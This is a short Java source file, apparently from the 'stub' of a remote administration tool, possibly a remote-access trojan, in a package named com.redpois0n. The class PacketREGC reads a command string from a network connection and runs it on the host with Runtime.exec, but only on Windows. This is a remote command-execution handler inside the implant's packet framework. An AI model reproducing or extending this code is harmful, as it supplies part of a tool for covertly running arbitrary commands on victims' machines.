package com.redpois0n.stub.packets.incoming;

import com.redpois0n.Connection;
import com.redpois0n.common.OperatingSystem;

public class PacketREGC extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String cmd = Connection.readLine();
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(cmd);
			} else {
				throw new Exception("Windows only");
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
